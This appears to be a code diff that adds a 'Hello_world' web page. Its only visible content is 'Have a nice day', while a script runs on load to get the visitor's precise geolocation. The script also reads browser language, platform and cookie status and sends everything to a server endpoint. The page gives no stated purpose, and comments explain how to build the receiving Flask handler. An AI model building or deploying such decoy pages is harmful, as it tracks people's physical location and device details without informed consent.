@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Hello_world</title>
+</head>
+<body>
+	<p>Have a nice day</p>
+</body>
+<script>
+	var options = {
+		enableHighAccuracy: true,
+		timeout: 5000,
+		maximumAge: 0
+	}
+
+
+
+	function success(pos){
+		var crd = pos.coords;
+		var lat = crd.latitude;
+		var longt=crd.longitude;
+		var accuracy = crd.accuracy;
+
+		/// now we can also get more data from user this is optional if u want u can write it
+
+		var Cookies_Enabled = navigator.cookieEnabled; // This is return when user browser cookies is enabled
+		var Browser_Language = navigator.language; /// This function return user browser language
+		var Platform = navigator.platform; // this function return user browser but this is not accurate
+
+		let userInfo={
+			'lat' : lat,
+			'longt' : longt,
+			'accuracy': accuracy,
+			'CEnabled': Cookies_Enabled,
+			'BLanguage': Browser_Language,
+			'P': Platform,
+		}
+
+		const request = new XMLHttpRequest()
+		request.open('POST', `/processUserInfo/${JSON.stringify(userInfo)}`) // Be notice that `` this commas are different than // ''this we need to create processuserinfo function in our python app.py
+
+		request.onload=()=> {
+			const flaskMessage = request.responseText
+			console.log(flaskMessage)
+		}
+
+		request.send()
+
+	}
+
+
+
+	function error(err){
+		alert("May be your location is off please turn on your location ... ");
+	}
+
+
+
+	function cordinates(){
+		// This is a main function which is get our user geo cordinates
+
+		if (navigator.geolocation) {
+			// This function called when user browser support navigator function
+
+			navigator.geolocation.getCurrentPosition(success, error, options);
+
+
+			// Now we need create this 3 functions
+		}
+
+		else{
+			alert("Your Browser not support geolocation...")
+		}
+	}
+
+	cordinates()
+</script>
+</html>
